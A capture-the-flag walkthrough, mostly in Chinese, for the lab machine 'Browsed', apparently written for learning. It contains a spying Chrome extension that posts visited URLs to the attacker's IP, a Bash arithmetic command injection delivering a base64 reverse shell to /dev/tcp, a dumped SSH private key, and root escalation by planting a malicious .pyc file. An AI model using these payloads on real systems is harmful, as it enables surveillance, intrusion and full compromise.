## Browsed
```
[★]$ nmap -sCV 10.129.244.79
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-06 03:08 CDT
Nmap scan report for 10.129.244.79
Host is up (0.010s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:c8:a4:ba:c5:ed:0b:13:ef:b7:e7:d7:ef:a2:9d:92 (ECDSA)
|_  256 53:ea:be:c7:07:05:9d:aa:9f:44:f8:bf:32:ed:5c:9a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Browsed
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
```
### 访问80端口
#### 点击'Upload Extension'
```

Upload Your Chrome Extension

Share your Chrome extension (zip format) with us!
A developper will use it and reach back with some feedback
Files must be directly inside the archive, not in a folder.

Upload Chrome Extension (.zip):
```
#### 点击'Samples' 下载了Fortify
```
[★]$ unzip fontify.zip
Archive:  fontify.zip
  inflating: content.js              
  inflating: manifest.json           
  inflating: popup.html              
  inflating: popup.js                
  inflating: style.css
```
<details>
<summary>cat manifest.json</summary>

```
[★]$ cat manifest.json
{
  "manifest_version": 3,
  "name": "Font Switcher",
  "version": "2.0.0",
  "description": "Choose a font to apply to all websites!",
  "permissions": [
    "storage",
    "scripting"
  ],
  "action": {
    "default_popup": "popup.html",
    "default_title": "Choose your font"
  },
  "content_scripts": [
    {
      "matches": [
        "<all_urls>"
      ],
      "js": [
        "content.js"
      ],
      "run_at": "document_idle"
    }
  ]
}
```
</details>

<details>
<summary>cat popup.js</summary>
  
```
[★]$ cat popup.js
const fontSelector = document.getElementById("fontSelector");

chrome.storage.sync.get("selectedFont", ({ selectedFont }) => {
  if (selectedFont) {
    fontSelector.value = selectedFont;
  }
});

fontSelector.addEventListener("change", () => {
  const selectedFont = fontSelector.value;
  chrome.storage.sync.set({ selectedFont }, () => {
    chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
      chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: (font) => {
          const style = document.createElement("style");
          style.innerText = `* { font-family: '${font}' !important; }`;
          document.head.appendChild(style);
        },
        args: [selectedFont]
      });
    });
  });
});
```
</details>

### 立足依据 Foothold
#### 由于开发者会安装他们上传的扩展程序，我们可以利用这种行为来监控他们的浏览活动。通过创建一个能拦截传出请求并将其转发到我们服务器的 Chrome 扩展程序，我们就能追踪开发者访问的每一个页面。索引页面还提到开发者使用的是 Chrome v134 版本，该版本依赖于 Manifest v3，所以我们的扩展程序必须相应地进行构建。
https://developer.chrome.com/docs/extensions/develop/migrate/what-is-mv3?hl=zh-cn
#### 要构建这个 Chrome 扩展程序，我们可以参考这份guide指南，2024 年最简单的 Chrome 扩展程序教程（使用 Manifest V3）：
https://dev.to/azadshukor/simplest-chrome-extension-tutorial-for-2024-using-manifest-v3-h3m
#### 我们主要需要创建两个文件 
##### 显示.JSON，它定义了扩展程序的元数据、权限和入口点。
```
[★]$ vi manifest.json
{
		"manifest_version": 3,
		"name": "Parallel Request Sender",
		"version": "1.0",
		"description": "Spyer extension to log visited websites",
		"permissions": [
				"declarativeNetRequest",
				"declarativeNetRequestWithHostAccess",
				"storage",
				"tabs",
				"webRequest"
		],
		"host_permissions": [
				"<all_urls>"
		],
		"background": {
				"service_worker": "background.js"
		}
}
```
##### background.js，其中包含在后台运行以处理事件和执行操作的逻辑。
```
[★]$ vi background.js
chrome.webRequest.onBeforeRequest.addListener(
		function (details) {
				if (!details.url.includes("http://10.10.15.139")) {
						fetch("http://10.10.15.139:4444", {
								method: "POST",
								headers: {
										"Content-Type": "application/json",
								},
								body: JSON.stringify({
										originalUrl: details.url,
										timestamp: new Date().toISOString(),
								}),
								mode: 'no-cors',
						})
				}
		},
		{ urls: ["<all_urls>"] }
);"] }
);
```
```
[★]$ zip addon.zip manifest.json background.js
  adding: manifest.json (deflated 43%)
  adding: background.js (deflated 39%)
```
#### 在上传扩展程序之前，我们需要在我们的机器上设置一个监听器来捕获传入的 HTTP 请求。由于我们希望记录每个 POST 请求及其详细信息，仅仅使用标准的 Python HTTP 服务器是不够的。相反，我们可以在一个名为 server.js 的文件中创建一个简单的 JavaScript 服务器。
```
[★]$ vi server.js
const http = require('http');
http.createServer((req, res) => {
		let body = '';
		req.on('data', chunk => body += chunk);
		req.on('end', () => {
				console.log(`\n--- ${req.method} ${req.url} ---\n${JSON.stringify(req.headers, null, 2)}\nBody:\n${body}`);
				res.writeHead(200, { 'Content-Type': 'text/plain' });
				res.end('OK\n');
		});
}).listen(4444, () => console.log('Server listening on port 4444'));
```
#### 启动服务器以捕获 HTTP 请求。
```
[★]$ node server.js
Server listening on port 4444


```
#### 现在一切都已准备就绪。将扩展程序的压缩文件上传至网站后，稍作等待，我们便能在服务器上看到新的请求进来，这些请求显示了一个新的内部主机名——browsedinternals.htb 。
```
 [★]$ node server.js
Server listening on port 4444

--- POST / ---
{
  "host": "10.10.15.139:4444",
  "connection": "keep-alive",
  "content-length": "104",
  "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
  "content-type": "text/plain;charset=UTF-8",
  "accept": "*/*",
  "origin": "chrome-extension://ofpjodhgdkndahokbggjcoadhkfnlhjc",
  "accept-encoding": "gzip, deflate",
  "accept-language": "en-US,en;q=0.9"
}
Body:
{"originalUrl":"http://browsedinternals.htb/assets/img/logo.svg","timestamp":"2026-04-06T09:09:55.442Z"}
<SNIP>
```
#### 看到了域名
```
[★]$ echo "10.129.244.79 browsedinternals.htb" | sudo tee -a /etc/hosts
```
### 访问http://browsedinternals.htb
#### 点击Explore 
#### 看见 larry/MarkdownPreview
#### 我们发现有一个名为“MarkdownPreview”的公共存储库，其描述表明这是一个将 Markdown 文件转换为 HTML 的网络应用程序。'our md files to html'
```
# markdownPreview

This webapp allows us to convert our md files to html. Still in developement, it should only run locally !!!
```
```
[★]$ git clone http://browsedinternals.htb/larry/MarkdownPreview.git
[★]$ cd MarkdownPreview
[★]$ ls
app.py  backups  files  log  README.md  routines.sh
```
#### 在查看源代码后，我们发现该应用程序是一个简单的 Flask 服务，它利用 markdown 模块将 Markdown 输入转换为 HTML。这种功能本身并不存在漏洞。然而，在检查 app.py 中的路由时，端点 routines 站在了突出的位置。
```
[★]$ cat app.py
<SNIP>
@app.route('/routines/<rid>')
def routines(rid):
    # Call the script that manages the routines
    # Run bash script with the input as an argument (NO shell)
    subprocess.run(["./routines.sh", rid])  //没有 shell（防止 ; id）, 但 Bash 自己会解析 $()
    return "Routine executed !"
</SNIP>
```
#### 尽管在使用 subprocess.run() 时未设置 shell=True ，但用户自定义的输入参数 rid 仍直接被传递到了 routines.sh 的 bash 脚本中。查看 routines.sh 文件，我们发现以下行：
```
[★]$ cat routines.sh
<SNIP>
if [[ "$1" -eq 0 ]]; then    //如果第一个参数等于 0，就执行 then 后的代码
  # Routine 0: Clean temp files
  find "$TMP_DIR" -type f -name "*.tmp" -delete
  log_action "Routine 0: Temporary files cleaned."
  echo "Temporary files cleaned."
</SNIP>

//在进入 [[ ... ]] 判断之前，Bash 会先执行 $()（命令替换）
[[ "$1" -eq 0 ]]
Bash 实际会按这个顺序处理：
[1]变量展开（$1）
[2]命令替换（$()）
[3]再执行 [[ 判断 ]]
-eq 会让 Bash 把 $1 当“表达式”解析，而不是普通字符串
```
| 写法    | 含义  |
| ----- | --- |
| `-eq` | 等于  |
| `-ne` | 不等于 |
| `-gt` | 大于  |
| `-lt` | 小于  |
#### 这引发了一个微妙的命令注入漏洞，相关详细说明请见此处。最终的译文：这个
#### “-eq”运算符会迫使 bash 将输入视为一个算术表达式，这使得像 $() 这样的结构在解析过程中也能被计算。因此，即使没有明确使用 eval ，命令的执行也是可行的。我们可以从该博客中推断出这个漏洞利用代码，并对其在 routines.sh 脚本中的有效性进行验证。
```
[★]$ ./routines.sh 'x[$(cat /etc/passwd > /proc/$$/fd/1)]'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
<SNIP>
```
#### 但实际上在 [[ ... ]] 里： 会发生命令替换 $()
#### /proc/$$/fd/1 :$$ = 当前 shell PID ,  fd/1 = stdout
#### 在此，所注入的命令会被执行，并且其输出会被重定向到脚本的标准输出端口。这确认该端点存在命令注入漏洞。
#### 此时，直接利用该漏洞是不可行的，因为 Flask 应用程序被绑定到了 127.0.0.1 ，这意味着它仅能在目标机器本地进行访问。然而，此前我们已经确定，开发人员会安装上传的 Chrome 扩展程序，这为我们提供了一种通过浏览器与内部服务进行交互的方式。
#### 为了利用这一点，我们创建了另一个恶意扩展程序，它向 127.0.0.1 上的易受攻击端点发送请求。由于正在使用的 Chrome 版本依赖于 Manifest v3，后台脚本作为服务工作程序运行，这些脚本在扩展加载或由浏览器初始化时会自动执行。
#### 我们使用标准的反向 shell 有效负载，但由于像 / 这样的字符可能会干扰 Flask 路由，我们对有效负载进行了 base64 编码：
```
[★]$ echo -n "bash -i >& /dev/tcp/10.10.15.139/9011 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMzkvOTAxMSAwPiYx

//-n 不输出换行符（newline）
```
#### 将此数据包嵌入到 background.js 文件中，并在扩展加载时执行的请求中进行传递。
```
[★]$ cat background.js
function onExtensionLoaded() {
		fetch('http://127.0.0.1:5000/routines/x[$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMzkvOTAxMSAwPiYx | base64 -d | bash)]')
}
onExtensionLoaded();
```
#### 这意味着，一旦开发者安装或重新加载扩展程序，后台服务工作进程就会启动并执行相应功能，从而触发请求，而无需用户的任何操作。这是因为该扩展程序运行在开发者浏览器的环境中，能够访问本地服务。当发出请求时，数据包会被解码并在此易受攻击的 bash 脚本中执行。
#### 我们可以为这个扩展程序重复使用同一个 manifest.json 文件。接下来，将这两个文件打包成一个 zip 文件。
```
[★]$ zip pwn.zip manifest.json background.js
  adding: manifest.json (deflated 43%)
  adding: background.js (deflated 15%)
```
#### 开启侦听
```
[★]$ nc -lvnp 9011
listening on [any] 9011 ...
```
#### 上传.zip文件,'Send to the developer'
```
[★]$ nc -lvnp 9011
listening on [any] 9011 ...
connect to [10.10.15.139] from (UNKNOWN) [10.129.244.79] 60756
bash: cannot set terminal process group (1410): Inappropriate ioctl for device
bash: no job control in this shell
larry@browsed:~/markdownPreview$ id
id
uid=1000(larry) gid=1000(larry) groups=1000(larry)
```
```
larry@browsed:~/.ssh$ ls -la ~/.ssh
ls -la ~/.ssh
total 20
drwx------ 2 larry larry 4096 Jan  6 10:28 .
drwxr-x--- 9 larry larry 4096 Jan  6 11:11 ..
-rw------- 1 larry larry   95 Aug 17  2025 authorized_keys
-rw------- 1 larry larry  399 Aug 17  2025 id_ed25519
-rw-r--r-- 1 larry larry   95 Aug 17  2025 id_ed25519.pub
larry@browsed:~/.ssh$ cat id_ed25519
cat id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDZZIZPBRF8FzQjntOnbdwYiSLYtJ2VkBwQAS8vIKtzrwAAAJAXb7KHF2+y
hwAAAAtzc2gtZWQyNTUxOQAAACDZZIZPBRF8FzQjntOnbdwYiSLYtJ2VkBwQAS8vIKtzrw
AAAEBRIok98/uzbzLs/MWsrygG9zTsVa9GePjT52KjU6LoJdlkhk8FEXwXNCOe06dt3BiJ
Iti0nZWQHBABLy8gq3OvAAAADWxhcnJ5QGJyb3dzZWQ=
-----END OPENSSH PRIVATE KEY-----
```
#### 竟然不用密码
```
[★]$ cat id_larry.rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDZZIZPBRF8FzQjntOnbdwYiSLYtJ2VkBwQAS8vIKtzrwAAAJAXb7KHF2+y
hwAAAAtzc2gtZWQyNTUxOQAAACDZZIZPBRF8FzQjntOnbdwYiSLYtJ2VkBwQAS8vIKtzrw
AAAEBRIok98/uzbzLs/MWsrygG9zTsVa9GePjT52KjU6LoJdlkhk8FEXwXNCOe06dt3BiJ
Iti0nZWQHBABLy8gq3OvAAAADWxhcnJ5QGJyb3dzZWQ=
-----END OPENSSH PRIVATE KEY-----
[★]$ chmod 600 id_larry.rsa
[★]$ ssh -i id_larry.rsa larry@10.129.244.79
larry@browsed:~$ cat user.txt
```
### 特权升级
```
larry@browsed:~$ sudo -l
Matching Defaults entries for larry on browsed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```
#### 我们进入 /opt/extensiontool 目录并查看源代码。该脚本似乎能够处理 Chrome 扩展程序，其功能包括验证扩展程序的清单文件、更新版本以及对其进行打包。在乍一看，似乎没有任何东西可以直接加以利用。然而，仔细查看目录结构后会发现，__pycache__ 目录是当前用户可写的。
```
larry@browsed:/opt/extensiontool$ ls -la
total 24
drwxr-xr-x 4 root root 4096 Dec 11 07:54 .
drwxr-xr-x 4 root root 4096 Aug 17  2025 ..
drwxrwxr-x 5 root root 4096 Mar 23  2025 extensions
-rwxrwxr-x 1 root root 2739 Mar 27  2025 extension_tool.py
-rw-rw-r-- 1 root root 1245 Mar 23  2025 extension_utils.py
drwxrwxrwx 2 root root 4096 Dec 11 07:57 __pycache__
```
```
larry@browsed:/opt/extensiontool$ ls -la __pycache__/
total 12
drwxrwxrwx 2 root root 4096 Apr  6 10:16 .
drwxr-xr-x 4 root root 4096 Dec 11 07:54 ..
-rw-r--r-- 1 root root 1880 Apr  6 10:16 extension_utils.cpython-312.pyc
```
<details>
<summary>如果extension_utils.cpython-312.pyc不存在就编译它</summary>

```
larry@browsed:/opt/extensiontool$ ls -la __pycache__/
total 8
drwxrwxrwx 2 root root 4096 Apr  6 11:10 .
drwxr-xr-x 4 root root 4096 Dec 11 07:54 ..
larry@browsed:/opt/extensiontool$ ls
extensions  extension_tool.py  extension_utils.py  __pycache__
larry@browsed:/opt/extensiontool$ python3 -m py_compile extension_utils.py
larry@browsed:/opt/extensiontool$ ls -la __pycache__/
total 12
drwxrwxrwx 2 root  root  4096 Apr  6 11:19 .
drwxr-xr-x 4 root  root  4096 Dec 11 07:54 ..
-rw-rw-r-- 1 larry larry 1861 Apr  6 11:19 extension_utils.cpython-312.pyc
```
</details>

#### 这一点意义重大，因为 Python 会将编译后的字节码（.pyc 文件）存储于此，当导入模块时这些字节码会自动被加载。此外，我们还可以注意到该脚本从本地模块 extension_utils 中导入了一些函数。
```
larry@browsed:/opt/extensiontool$ cat extension_tool.py
#!/usr/bin/python3.12
import json
import os
from argparse import ArgumentParser
from extension_utils import validate_manifest, clean_temp_files
import zipfile

...<SNIP>...
```
#### 我们可以查看 extension_utils.py 文件，从中可以看到它定义了两个主要函数：validate_manifest() 和 clean_temp_files() 。
```
larry@browsed:/opt/extensiontool$ cat extension_utils.py
import os
import json
import subprocess
import shutil
from jsonschema import validate, ValidationError

# Simple manifest schema that we'll validate
MANIFEST_SCHEMA = {
    "type": "object",
    "properties": {
        "manifest_version": {"type": "number"},
        "name": {"type": "string"},
        "version": {"type": "string"},
        "permissions": {"type": "array", "items": {"type": "string"}},
    },
    "required": ["manifest_version", "name", "version"]
}

# --- Manifest validate ---
def validate_manifest(path):
    with open(path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    try:
        validate(instance=data, schema=MANIFEST_SCHEMA)
        print("[+] Manifest is valid.")
        return data
    except ValidationError as e:
        print("[x] Manifest validation error:")
        print(e.message)
        exit(1)

# --- Clean Temporary Files ---
def clean_temp_files(extension_dir):
    """ Clean up temporary files or unnecessary directories after packaging """
    temp_dir = '/opt/extensiontool/temp'

    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
        print(f"[+] Cleaned up temporary directory {temp_dir}")
    else:
        print("[+] No temporary files to clean.")
    exit(0)
```
#### 如果我们能够替换扩展库“extension_utils”中的缓存字节码，就能控制脚本以超级用户身份运行时所执行的内容。为此，我们首先使用“sudo”命令运行该脚本一次，以确保生成一个有效的“.pyc”文件。
```
larry@browsed:/opt/extensiontool$ sudo /opt/extensiontool/extension_tool.py
[X] Use one of the following extensions : ['Fontify', 'Timer', 'ReplaceImages']
```
#### 接下来，我们创建一个恶意的 Python 模块。我们并非重新构建整个原始模块，而是只实现该脚本实际使用的特定函数，即“验证清单”和“清理临时文件”这两个函数。这些是在执行过程中会被调用的函数，因此仅覆盖这两个函数就足以实现代码执行权限。
```
larry@browsed:/tmp$ vi evil_module.py
larry@browsed:/tmp$ cat evil_module.py
def validate_manifest(path):
	import os 
	os.system("/bin/bash")

def clean_temp_files(path):
	import os
	os.system("/bin/bash")
```
#### 我们通过编译此文件来生成一个 .pyc 文件。
```
larry@browsed:/tmp$ python3 -m py_compile /tmp/evil_module.py
larry@browsed:/tmp$ ls -la __pycache__
total 12
drwxrwxr-x  2 larry larry 4096 Apr  6 11:02 .
drwxrwxrwt 14 root  root  4096 Apr  6 11:11 ..
-rw-rw-r--  1 larry larry  466 Apr  6 11:02 evil_module.cpython-312.pyc
```
#### 然而，仅仅替换原始的.pyc 文件是不够的。Python 的.pyc 文件包含一个头部（前 16 个字节），其中包含诸如时间戳和版本信息等元数据。如果此头部不符合预期，该文件可能被忽略或拒绝。
#### 为解决此问题，我们可以编写一个 Python 脚本，从合法的.pyc 文件中复制头部，并将其附加到我们的恶意字节码中。此外，由于我们没有对原始文件的写入权限，但对目录有写入权限，该脚本可以删除合法的头部。.将“pyc”替换为我们修改后的版本。
```
larry@browsed:/tmp$ vi create_header.py

larry@browsed:/tmp$ cat create_header.py
def transplant_header(good_pyc, evil_pyc, output_pyc):
	with open(good_pyc, 'rb') as f:
		good_header = f.read(16)

	with open(evil_pyc, 'rb') as f:
		evil_data = f.read()

	new_pyc = good_header + evil_data[16:]
	import os
	os.system(f"rm {output_pyc}")
	with open(output_pyc, 'wb') as f:
		f.write(new_pyc)

	print(f"[+] Transplanted header from {good_pyc} into {evil_pyc}, saved as {output_pyc}")

transplant_header(
	'/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc',
	'/tmp/__pycache__/evil_module.cpython-312.pyc',
	'/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc'
)
```
#### 要先开侦听 
```
 [★]$ nc -lvnp 9011
listening on [any] 9011 ...
```
#### 开了侦听 执行成功了 执行$ python3 create_header.py为什么要开侦听
```
当目标程序执行：import extension_utils
才会触发写进去的：os.system("/bin/bash")
或者你后面改成：bash -i >& /dev/tcp/10.10.15.139/9011 0>&1
```
#### 运行
```
larry@browsed:/tmp$ python3 create_header.py
[+] Transplanted header from /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc into /tmp/__pycache__/evil_module.cpython-312.pyc, saved as /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc
```
#### 现在，再次执行这个具有特权的脚本。当脚本导入模块时，Python 会加载我们的恶意.pyc 文件而非原始文件，从而使我们的恶意代码以管理员权限执行。这就会产生一个根权限的 shell。
```
larry@browsed:/opt/extensiontool$ sudo -l
Matching Defaults entries for larry on browsed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
larry@browsed:/opt/extensiontool$ sudo /opt/extensiontool/extension_tool.py
[X] Use one of the following extensions : ['Fontify', 'Timer', 'ReplaceImages']
larry@browsed:/opt/extensiontool$ sudo /opt/extensiontool/extension_tool.py --ext Fontify
[+] Manifest is valid.
[-] Skipping version bumping
[-] Skipping packaging
larry@browsed:/opt/extensiontool$ id
uid=1000(larry) gid=1000(larry) groups=1000(larry)
```
#### 说呢 为什么要nc
```
larry@browsed:/tmp$ vi evil_module.py
larry@browsed:/tmp$ cat evil_module.py
def validate_manifest(path):
	import os
	os.system("/bin/bash")

def clean_temp_files(path):
	import os 
	os.system("bash -i >& /dev/tcp/10.10.15.139/9011 0>&1")
```
```
larry@browsed:/tmp$ python3 -m py_compile /tmp/evil_module.py
```
```
larry@browsed:/opt/extensiontool$ python3 -m py_compile extension_utils.py
```
larry@browsed:/tmp$ python3 create_header.py
[+] Transplanted header from /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc into /tmp/__pycache__/evil_module.cpython-312.pyc, saved as /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc
```
```
larry@browsed:/tmp$ sudo  /opt/extensiontool/extension_tool.py --ext Fontify
root@browsed:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@browsed:/tmp# cat /root/root.txt
```
